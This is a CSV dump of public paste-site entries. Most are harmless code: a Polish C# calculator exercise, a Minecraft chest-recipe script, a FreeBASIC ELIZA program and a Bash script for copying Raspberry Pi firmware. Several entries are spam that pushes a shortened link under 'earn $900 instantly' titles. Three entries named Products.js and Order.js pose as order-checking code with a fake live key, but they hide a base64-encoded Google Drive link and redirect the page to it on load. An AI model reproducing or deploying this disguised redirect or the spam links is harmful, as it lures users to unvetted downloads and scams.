id,title,username,language,date,content
12jXW4VK,EARN $900 INSTANTLY 2025 BT,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 07:01:30 AM CDT," 
Pdf https://tinyurl.com/methodssss


icFdkk1a1Q
"
xV1f4jj3,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:00:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HBnyKVA4,debug,Cassimus,C#,Saturday 29th of March 2025 07:00:18 AM CDT,"public class Lekcja8
{
    public static void Main(string[] args)
    {
        System.Console.WriteLine(""Cześć! Jak masz na imię?"");
        string? imie = Console.ReadLine();

        if (imie == null) return;

        System.Console.WriteLine($""Witaj {imie.ToUpper()}. Co Chcesz robić?: "");
        System.Console.WriteLine(""a. dodawanie \nb. odejmowanie \nc. mnożenie \nd. dzielenie"");

        string? wybor = Console.ReadLine();
        if (wybor == null) return;

        Console.Write(""Podaj pierwszą liczbę: "");
        int liczba1;

        try
        {
            liczba1 = int.Parse(Console.ReadLine()!);
        }
        catch (FormatException format)
        {
            System.Console.WriteLine(""Podana wartość nie jest liczbą"");
            System.Console.WriteLine(format.Message);
            return;
        }
        catch (Exception)
        {
            System.Console.WriteLine(""Coś poszlo nie tak"");
            return;
        }

        int liczba2;
        bool parsowanie = int.TryParse(Console.ReadLine(), out liczba2);

        if (!parsowanie)
        {
            System.Console.WriteLine(""To nie jest liczba"");
            return;
        }

        System.Console.WriteLine($""Podałeś liczbę: {liczba1}"");

    }
}

"
n6werbVV,dataNone,TestGuy1,JSON,Saturday 29th of March 2025 07:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '901994cf17ff280b14d0c971a40c830a2e8fc6bd8fd4d4d902f753cc3af87f814b473c097bf6ad3776b307dd41625a2045b4f073baa73a986decb9039468b8b89958aee958bd358971244ecc45d36de570233841c11f4fca41ac82a5dc32a0ea7df903df2838bdc0fa91226d7c4b55b338912864bf86680237767ccad4560026',
  otherdata: [
    '3c960dfd7c0b63ea89f0938facfb3c92',
    'f10e3c2851b74f55de7558b7401165e6',
    'f4fe021e3c52e5e8513574169b3884fd',
    'f9a2aa27fd8b08cc70087e2c94d65517',
    '34d74f3806bb371cdf61c430bf057958',
    '9394754da3c56bbc9d035f9a9ce2d3c2',
    '349770ba2c96a21bfe774244b84b99df',
    '8930215732f67c8bcd54d5400eb1d8ff'
  ]
}"
9cV5w9Tp,Script JS pour remplacer le craft des coffres sans devoir tous les faires un par un,Alexisdepris,JavaScript,Saturday 29th of March 2025 06:54:30 AM CDT,"ServerEvents.recipes(e => {
    let woodToChestMap = {
        // Ecologics
        'ecologics:coconut_planks': 'everycomp:q/ecologics/coconut_chest',
        'ecologics:azalea_planks': 'everycomp:q/ecologics/azalea_chest',
        'ecologics:walnut_planks': 'everycomp:q/ecologics/walnut_chest',
        // Nature's Spirit
        'natures_spirit:cedar_planks': 'everycomp:q/natures_spirit/cedar_chest',
        'natures_spirit:larch_planks': 'everycomp:q/natures_spirit/larch_chest',
        'natures_spirit:mahogany_planks': 'everycomp:q/natures_spirit/mahogany_chest',
        'natures_spirit:saxaul_planks': 'everycomp:q/natures_spirit/saxaul_chest',
        'natures_spirit:redwood_planks': 'everycomp:q/natures_spirit/redwood_chest',
        'natures_spirit:sugi_planks': 'everycomp:q/natures_spirit/sugi_chest',
        'natures_spirit:wisteria_planks': 'everycomp:q/natures_spirit/wisteria_chest',
        'natures_spirit:fir_planks': 'everycomp:q/natures_spirit/fir_chest',
        'natures_spirit:coconut_planks': 'everycomp:q/natures_spirit/coconut_chest',
        'natures_spirit:willow_planks': 'everycomp:q/natures_spirit/willow_chest',
        'natures_spirit:aspen_planks': 'everycomp:q/natures_spirit/aspen_chest',
        'natures_spirit:maple_planks': 'everycomp:q/natures_spirit/maple_chest',
        'natures_spirit:cypress_planks': 'everycomp:q/natures_spirit/cypress_chest',
        'natures_spirit:olive_planks': 'everycomp:q/natures_spirit/olive_chest',
        'natures_spirit:joshua_planks': 'everycomp:q/natures_spirit/joshua_chest',
        'natures_spirit:ghaf_planks': 'everycomp:q/natures_spirit/ghaf_chest',
        'natures_spirit:palo_verde_planks': 'everycomp:q/natures_spirit/palo_verde_chest',
        // Wevegone
        'biomeswevegone:aspen_planks': 'everycomp:q/biomeswevegone/aspen_chest',
        'biomeswevegone:baobab_planks': 'everycomp:q/biomeswevegone/baobab_chest',
        'biomeswevegone:blue_enchanted_planks': 'everycomp:q/biomeswevegone/blue_enchanted_chest',
        'biomeswevegone:cika_planks': 'everycomp:q/biomeswevegone/cika_chest',
        'biomeswevegone:cypress_planks': 'everycomp:q/biomeswevegone/cypress_chest',
        'biomeswevegone:ebony_planks': 'everycomp:q/biomeswevegone/ebony_chest',
        'biomeswevegone:fir_planks': 'everycomp:q/biomeswevegone/fir_chest',
        'biomeswevegone:green_enchanted_planks': 'everycomp:q/biomeswevegone/green_enchanted_chest',
        'biomeswevegone:holly_planks': 'everycomp:q/biomeswevegone/holly_chest',
        'biomeswevegone:skyris_planks': 'everycomp:q/biomeswevegone/skyris_chest',
        'biomeswevegone:white_mangrove_planks': 'everycomp:q/biomeswevegone/white_mangrove_chest',
        'biomeswevegone:willow_planks': 'everycomp:q/biomeswevegone/willow_chest',
        'biomeswevegone:witch_hazel_planks': 'everycomp:q/biomeswevegone/witch_hazel_chest',
        'biomeswevegone:zelkova_planks': 'everycomp:q/biomeswevegone/zelkova_chest',
        'biomeswevegone:ironwood_planks': 'everycomp:q/biomeswevegone/ironwood_chest',
        'biomeswevegone:jacaranda_planks': 'everycomp:q/biomeswevegone/jacaranda_chest',
        'biomeswevegone:mahogany_planks': 'everycomp:q/biomeswevegone/mahogany_chest',
        'biomeswevegone:maple_planks': 'everycomp:q/biomeswevegone/maple_chest',
        'biomeswevegone:palm_planks': 'everycomp:q/biomeswevegone/palm_chest',
        'biomeswevegone:pine_planks': 'everycomp:q/biomeswevegone/pine_chest',
        'biomeswevegone:rainbow_eucalyptus_planks': 'everycomp:q/biomeswevegone/rainbow_eucalyptus_chest',
        'biomeswevegone:redwood_planks': 'everycomp:q/biomeswevegone/redwood_chest',
        'biomeswevegone:sakura_planks': 'everycomp:q/biomeswevegone/sakura_chest',
        // Quark
        'quark:ancient_planks': 'quark:ancient_chest',
        'quark:azalea_planks': 'quark:azalea_chest',
        'quark:blossom_planks': 'quark:blossom_chest',
        'minecraft:oak_planks': 'quark:oak_chest',
        'minecraft:spruce_planks': 'quark:spruce_chest',
        'minecraft:birch_planks': 'quark:birch_chest',
        'minecraft:jungle_planks': 'quark:jungle_chest',
        'minecraft:acacia_planks': 'quark:acacia_chest',
        'minecraft:dark_oak_planks': 'quark:dark_oak_chest',
        'minecraft:prismarine': 'quark:prismarine_chest',
        'minecraft:purpur_block': 'quark:purpur_chest',
        'minecraft:nether_bricks': 'quark:nether_brick_chest',
        'minecraft:cherry_planks': 'quark:cherry_chest',
        'minecraft:bamboo_block': 'quark:bamboo_chest',
        'minecraft:mangrove_planks': 'quark:mangrove_chest',
        'minecraft:warped_planks': 'quark:warped_chest',
        'minecraft:crimson_planks': 'quark:crimson_chest'
    };

    for (let plank in woodToChestMap) {
        let chest = woodToChestMap[plank];
        
        // Suppression des recettes existantes pour éviter les conflits
        e.remove({ output: chest });
        
        // Ajout de la nouvelle recette avec une pépite de fer au centre
        e.shaped(Item.of(chest), [
            'PPP',
            'PIP',
            'PPP'
        ], {
            P: plank,
            I: 'minecraft:iron_nugget'
        });
    }
});
"
DZPPKwWJ,Random Gmail Acc 1A,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:45:36 AM CDT," 
Pdf https://tinyurl.com/methodssss


8ggjHeyf5V
"
cx8wi3vj,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:45:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/641/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UidXtdTv,Make $1000 15-MINUTES (BEGINNER) WM,TypicalGamer1227,JavaScript,Saturday 29th of March 2025 06:29:41 AM CDT," 
Pdf https://tinyurl.com/methodssss


EJB4IPT3Cq
"
HZVsrZS1,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:29:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/130/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tEHcgDQu,Untitled,ronblue,FreeBasic,Saturday 29th of March 2025 06:15:44 AM CDT,"' ELIZA in FreeBASIC with DOS-style Interface
' A nostalgic implementation of the classic ELIZA program
' Based on the original concept by Joseph Weizenbaum

#include ""fbgfx.bi""  ' Include graphics library

' Define variable types
Type KeywordPattern
    keyword As String
    rank As Integer
    responses(9) As String
    responseCount As Integer
End Type

Type Transformation
    pattern As String
    replacement As String
End Type

' Main program
Dim Shared patterns(20) As KeywordPattern
Dim Shared transforms(30) As Transformation
Dim Shared patternCount As Integer
Dim Shared transformCount As Integer
Dim Shared conversationHistory(100) As String
Dim Shared historyCount As Integer = 0

' Colors for DOS-style interface - using constants to avoid COLOR reserved word
Const C_FRAME = 9        ' Light blue
Const C_TITLE = 14       ' Yellow
Const C_TEXT = 7         ' Light gray
Const C_USER = 15        ' Bright white
Const C_ELIZA = 11       ' Cyan
Const C_STATUS = 10      ' Light green
Const C_BACKGROUND = 1   ' Blue

' Initialize patterns and transformations
Sub InitializePatterns()
    ' Keywords with their responses
    ' Pattern 1: ""i need""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i need""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Why do you need %s?""
    patterns(patternCount).responses(1) = ""Would it really help you to get %s?""
    patterns(patternCount).responses(2) = ""Are you sure you need %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 2: ""sorry""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""sorry""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""There's no need to apologize.""
    patterns(patternCount).responses(1) = ""What feelings do you have when you apologize?""
    patterns(patternCount).responses(2) = ""I've told you that apologies are not necessary.""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 3: ""i am"" or ""im""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i am""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you are %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5

    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""im""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you're %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5
    
    ' Pattern 4: ""i believe""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i believe""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""Do you really believe %s?""
    patterns(patternCount).responses(1) = ""But you're not sure you %s?""
    patterns(patternCount).responses(2) = ""Do you really doubt you %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 5: ""i feel""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i feel""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Tell me more about such feelings.""
    patterns(patternCount).responses(1) = ""Do you often feel %s?""
    patterns(patternCount).responses(2) = ""Do you enjoy feeling %s?""
    patterns(patternCount).responses(3) = ""What does feeling %s remind you of?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 6: ""i cant""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i cant""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""How do you know you can't %s?""
    patterns(patternCount).responses(1) = ""Have you tried?""
    patterns(patternCount).responses(2) = ""Perhaps you could %s now.""
    patterns(patternCount).responses(3) = ""Do you really want to be able to %s?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 7: ""i want""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i want""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""What would it mean to you if you got %s?""
    patterns(patternCount).responses(1) = ""Why do you want %s?""
    patterns(patternCount).responses(2) = ""What would you do if you got %s?""
    patterns(patternCount).responses(3) = ""If you got %s, then what would you do?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 8: ""what""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""what""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask?""
    patterns(patternCount).responses(1) = ""Does that question interest you?""
    patterns(patternCount).responses(2) = ""What is it you really want to know?""
    patterns(patternCount).responses(3) = ""Are such questions much on your mind?""
    patterns(patternCount).responses(4) = ""What do you think?""
    patterns(patternCount).responses(5) = ""What comes to mind when you ask that?""
    patterns(patternCount).responseCount = 6
    
    ' Pattern 9: ""how""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""how""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""How do you suppose?""
    patterns(patternCount).responses(1) = ""Perhaps you can answer your own question.""
    patterns(patternCount).responses(2) = ""What is it you're really asking?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 10: ""who""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""who""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask about %s?""
    patterns(patternCount).responses(1) = ""Would it matter to you?""
    patterns(patternCount).responses(2) = ""What do you think?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 11: generic responses for no match
    patternCount = patternCount + 1
    patterns(patternCount).keyword = """"
    patterns(patternCount).rank = 1
    patterns(patternCount).responses(0) = ""Very interesting.""
    patterns(patternCount).responses(1) = ""I see.""
    patterns(patternCount).responses(2) = ""I'm not sure I understand you fully.""
    patterns(patternCount).responses(3) = ""Can you elaborate on that?""
    patterns(patternCount).responses(4) = ""That is quite interesting.""
    patterns(patternCount).responses(5) = ""Please tell me more.""
    patterns(patternCount).responses(6) = ""Let's change focus a bit... Tell me about your family.""
    patterns(patternCount).responses(7) = ""Can you elaborate on that?""
    patterns(patternCount).responses(8) = ""Why do you say that?""
    patterns(patternCount).responses(9) = ""I see. And what does that suggest to you?""
    patterns(patternCount).responseCount = 10
    
    ' Set up transformations from first person to second person, etc.
    transformCount = 0
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" im ""
    transforms(transformCount).replacement = "" you're ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i am ""
    transforms(transformCount).replacement = "" you are ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" my ""
    transforms(transformCount).replacement = "" your ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" me ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" mine ""
    transforms(transformCount).replacement = "" yours ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you ""
    transforms(transformCount).replacement = "" I ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" your ""
    transforms(transformCount).replacement = "" my ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" yours ""
    transforms(transformCount).replacement = "" mine ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you are ""
    transforms(transformCount).replacement = "" I am ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you're ""
    transforms(transformCount).replacement = "" I'm ""
End Sub

' Transform user input for response
Function TransformInput(userInputText As String) As String
    Dim As String resultText = LCase(userInputText)
    
    ' Apply transformations
    For i As Integer = 1 To transformCount
        Dim As String patternText = transforms(i).pattern
        Dim As String replacementText = transforms(i).replacement
        
        ' Simple replace - in a more advanced version, use regular expressions
        Dim As Integer positionVal = InStr(resultText, patternText)
        While positionVal > 0
            resultText = Left(resultText, positionVal - 1) + replacementText + Mid(resultText, positionVal + Len(patternText))
            positionVal = InStr(positionVal + Len(replacementText), resultText, patternText)
        Wend
    Next
    
    Return resultText
End Function

' Find the best matching pattern
Function FindPattern(userInputText As String) As Integer
    Dim As Integer bestMatch = patternCount ' Default to generic responses
    Dim As Integer bestRank = 0
    
    ' Convert input to lowercase for case-insensitive matching
    Dim As String inputText = LCase(userInputText)
    
    ' Look for each pattern in the input
    For i As Integer = 1 To patternCount
        Dim As String keyword = patterns(i).keyword
        Dim As Integer positionVal = InStr(inputText, keyword)
        
        If positionVal > 0 And patterns(i).rank > bestRank Then
            bestMatch = i
            bestRank = patterns(i).rank
        End If
    Next
    
    Return bestMatch
End Function

' Get remainder of input after keyword
Function GetRemainder(userInputText As String, keywordIndex As Integer) As String
    Dim As String inputText = LCase(userInputText)
    Dim As String keyword = patterns(keywordIndex).keyword
    Dim As Integer positionVal = InStr(inputText, keyword)
    
    If positionVal > 0 And Len(keyword) > 0 Then
        Return Mid(inputText, positionVal + Len(keyword))
    Else
        Return """"
    End If
End Function

' Draw a single-line box
Sub DrawBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Top and bottom lines
    Line (x1, y1)-(x2, y1)
    Line (x1, y2)-(x2, y2)
    ' Left and right lines
    Line (x1, y1)-(x1, y2)
    Line (x2, y1)-(x2, y2)
End Sub

' Draw a double-line box
Sub DrawDoubleBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Outer box
    DrawBox(x1, y1, x2, y2, boxColor)
    ' Inner box
    DrawBox(x1 + 1, y1 + 1, x2 - 1, y2 - 1, boxColor)
End Sub

' Draw title bar
Sub DrawTitleBar(titleText As String)
    Color C_TITLE, C_FRAME
    ' Draw title background
    Line (1, 1)-(80, 3), C_FRAME, BF
    ' Print centered title
    Locate 2, 40 - Len(titleText) \ 2
    Print titleText;
End Sub

' Draw status bar
Sub DrawStatusBar(statusText As String)
    Color C_STATUS, C_FRAME
    ' Draw status background
    Line (1, 25)-(80, 25), C_FRAME, BF
    ' Print left-aligned status
    Locate 25, 2
    Print statusText;
    ' Print right-aligned help
    Locate 25, 60
    Print ""Press ESC to exit"";
End Sub

' Draw intro animation
Sub DrawIntro()
    Dim As String titleText = "" ELIZA - Electronic Psychotherapist ""
    Dim As Integer i, j, center_x = 40, center_y = 12
    
    ' Clear screen 
    Screen 0
    Width 80, 25
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw expanding circles animation
    For i = 1 To 15
        Circle (center_x, center_y), i, (i Mod 7) + 9
        Sleep 50
    Next i
    
    ' Animate title appear
    For i = 1 To Len(titleText)
        Locate center_y, center_x - Len(titleText) \ 2 + i
        Color ((i Mod 7) + 9)
        Print Mid(titleText, i, 1);
        Sleep 50
    Next i
    
    ' Flash the title
    For i = 1 To 3
        For j = 9 To 15
            Locate center_y, center_x - Len(titleText) \ 2
            Color j
            Print titleText;
            Sleep 50
        Next j
    Next i
    
    ' Wait a moment
    Sleep 500
    
    ' Clear the screen again for main interface
    Color C_TEXT, C_BACKGROUND
    Cls
End Sub

' Draw main interface
Sub DrawInterface()
    ' Clear screen with background color
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw outer frame
    DrawDoubleBox(1, 1, 80, 25, C_FRAME)
    
    ' Draw title bar
    DrawTitleBar(""ELIZA - Psychological Computer Therapist v2.1"")
    
    ' Draw conversation area frame
    DrawBox(2, 4, 79, 20, C_FRAME)
    
    ' Draw input area frame
    DrawBox(2, 21, 79, 24, C_FRAME)
    
    ' Draw status bar
    DrawStatusBar(""Ready for conversation"")
    
    ' Initial prompt
    Locate 5, 4
    Color C_ELIZA
    Print ""ELIZA: Hello, I am ELIZA. How are you feeling today?"";
    
    ' Set input prompt
    Locate 22, 4
    Color C_USER
    Print ""YOU: "";
End Sub

' Update conversation area with history
Sub UpdateConversation()
    ' Clear conversation area
    Color C_TEXT, C_BACKGROUND
    For i As Integer = 5 To 19
        Locate i, 4
        Print Space(75);
    Next i
    
    ' Display history (up to the most recent 14 lines)
    Dim As Integer startLine = 0
    If historyCount > 14 Then
        startLine = historyCount - 14
    End If
    
    For i As Integer = startLine To historyCount - 1
        Dim As Integer lineNum = 5 + (i - startLine)
        If Left(conversationHistory(i), 6) = ""ELIZA:"" Then
            Locate lineNum, 4
            Color C_ELIZA
        Else
            Locate lineNum, 4
            Color C_USER
        End If
        ' Wrap text if needed
        Dim As String textLine = conversationHistory(i)
        If Len(textLine) > 75 Then
            Print Left(textLine, 75);
            ' If line is too long, continue on next line
            If lineNum + 1 <= 19 Then
                Locate lineNum + 1, 4
                Print ""    "" + Mid(textLine, 76);
            End If
        Else
            Print textLine;
        End If
    Next i
End Sub

' Add text to conversation history
Sub AddToHistory(speaker As String, textMsg As String)
    conversationHistory(historyCount) = speaker + "": "" + textMsg
    historyCount = historyCount + 1
    UpdateConversation()
End Sub

' Display typing animation for ELIZA's responses
Sub DisplayTypingAnimation(responseText As String)
    Dim As Integer cursorY = 0
    
    ' Find the next available line position
    For i As Integer = 19 To 5 Step -1
        Locate i, 4
        Dim As String currentText = """"
        Dim As Integer visibleText = Pos(i) ' Get cursor position to check if line is empty
        If visibleText = 4 Then  ' If cursor is at starting position, line is empty
            cursorY = i
            Exit For
        End If
    Next i
    
    If cursorY = 0 Then cursorY = 19 ' Default to last line if all full
    
    ' Show ""ELIZA is typing..."" animation
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To 3
        Print ""."";
        Sleep 300
        Locate cursorY, 10 + i
    Next i
    
    ' Clear the ""typing"" text
    Locate cursorY, 4
    Print Space(15);
    
    ' Type out the response character by character
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To Len(responseText)
        Print Mid(responseText, i, 1);
        ' Randomize typing speed slightly
        Sleep 30 + (Rnd * 30)
    Next i
End Sub

' Main program
Sub Main()
    Dim As String userInputText, responseText
    Dim As Integer patternIndex, responseIndex
    Dim As String remainder
    Dim As String k
    
    ' Initialize patterns and transformations
    patternCount = 0
    transformCount = 0
    InitializePatterns()
    
    ' Display intro animation
    DrawIntro()
    
    ' Setup main interface
    DrawInterface()
    
    ' Add initial greeting to history
    AddToHistory(""ELIZA"", ""Hello, I am ELIZA. How are you feeling today?"")
    
    ' Main conversation loop
    Do
        ' Get user input
        Locate 22, 9
        Color C_USER
        Line Input """", userInputText
        
        ' Clear input line
        Locate 22, 9
        Print Space(70);
        
        ' Add user input to history
        If Len(userInputText) > 0 Then
            AddToHistory(""YOU"", userInputText)
        End If
        
        ' Exit if user types ""bye""
        If LCase(userInputText) = ""bye"" Then
            DisplayTypingAnimation(""Goodbye. I hope our conversation was helpful."")
            AddToHistory(""ELIZA"", ""Goodbye. I hope our conversation was helpful."")
            
            ' Wait for key press before exiting
            Locate 22, 4
            Color C_STATUS
            Print ""Press any key to exit..."";
            Sleep 500
            Do
                k = Inkey()
            Loop Until Len(k) > 0
            Exit Do
        End If
        
        ' Skip processing if empty input
        If Len(userInputText) = 0 Then
            DisplayTypingAnimation(""I didn't quite catch that. Can you say something?"")
            AddToHistory(""ELIZA"", ""I didn't quite catch that. Can you say something?"")
        Else
            ' Find the best matching pattern
            patternIndex = FindPattern(userInputText)
            
            ' Get a random response for this pattern
            responseIndex = Int(Rnd * patterns(patternIndex).responseCount)
            responseText = patterns(patternIndex).responses(responseIndex)
            
            ' If the response contains a placeholder, replace it with transformed input
            If InStr(responseText, ""%s"") > 0 Then
                remainder = GetRemainder(userInputText, patternIndex)
                remainder = TransformInput(remainder)
                
                ' Custom replacement for ""%s"" with remainder
                Dim As Integer placeholderPos = InStr(responseText, ""%s"")
                If placeholderPos > 0 Then
                    responseText = Left(responseText, placeholderPos - 1) + remainder + _
                                  Mid(responseText, placeholderPos + 2)
                End If
            End If
            
            ' Show typing animation and add to history
            DisplayTypingAnimation(responseText)
            AddToHistory(""ELIZA"", responseText)
        End If
        
        ' Check for escape key to exit
        k = Inkey()
        If k = Chr(27) Then ' ESC key
            Exit Do
        End If
    Loop
    
    ' Clean up
    Screen 0
    Width 80, 25
    Color 7, 0
    Cls
End Sub

' Start the program
Randomize Timer
Main()
End"
VFFqp6wh,raspberry_fw_uploader,orborbson,Bash,Saturday 29th of March 2025 06:14:54 AM CDT,"#!/usr/bin/env bash

usage(){
	case ""${1}"" in
		"""" | ""--help"" | ""-h"" ) echo -e ""Użycie: `basename ${0}` <nazwa_pliku_firmware>""; exit 0 ;;
	esac
}

check_file(){
	if [ ! -f ""${1}"" ]; then echo ""[BŁĄD]: brak pliku firmware o nazwie \""${1}\""""; exit 1; fi
}

set_vars(){
	FW_FILE=""`realpath -q ${1}`""
	TMPDIR=""${TMPDIR:-/tmp}""
	RP_DIR=""${TMPDIR}/raspberry_firmware_flash""
}

find_rp(){
	if [ -b /dev/sda[0-9] ]; then
		RP_DEV=""`readlink -f -q /dev/sda[0-9]`""
	elif [ -b /dev/block/sda[0-9] ]; then
		RP_DEV=""`readlink -f -q /dev/block/sda[0-9]`""
	else
		echo ""[BŁĄD]: nie znaleziono urządzenia. Uruchom RP w trybie bootloadera.""
		exit 1
	fi
}

mount_rp(){
	if ! check_mnt; then
		mkdir_rp
		if ! sudo mount -t vfat ""${RP_DEV}"" ""${RP_DIR}""; then
			echo ""[BŁĄD]: nie można zamontować RP""; clean; exit 1
		fi
	else
		echo ""[INFO]: już zamontowane, odmontowuję ...""; umount_rp; clean; exit 0
	fi
}

umount_rp(){
	sudo umount -q ""${RP_DIR}""
}

copy_firmware(){
	echo ""[INFO]: kopiuję firmware ...""
	sudo cp -f ""${FW_FILE}"" ""${RP_DIR}""
}

mkdir_rp(){
	if [ ! -d ""${RP_DIR}"" ]; then mkdir ""${RP_DIR}""; fi  > /dev/null 2>&1
}

clean(){
	if [ -d ""${RP_DIR}"" ]; then rm -fr ""${RP_DIR}""; fi  > /dev/null 2>&1
}

check_mnt(){
	findmnt ""${RP_DEV}"" > /dev/null 2>&1
}

success(){
	echo ""[INFO]: pomyślnie skopiowano firmware""
}

usage ""${1}""
check_file ""${1}""
set_vars ""${1}""
find_rp
mount_rp
copy_firmware
umount_rp
clean
success
"
